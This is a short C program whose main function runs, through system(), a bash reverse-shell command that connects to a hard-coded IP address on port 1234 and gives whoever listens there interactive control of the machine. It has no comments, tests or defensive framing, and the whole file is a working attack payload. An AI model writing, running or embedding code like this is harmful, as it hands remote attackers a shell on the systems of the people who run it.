#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    const char *cmd = "bash -c \"bash -i >& /dev/tcp/156.239.238.207/1234 0>&1\"";

    int rc = system(cmd);
    if (rc == -1) {
        fprintf(stderr, "failed to execute shell command: %s\n", strerror(errno));
        return 127;
    }

    return rc;
}
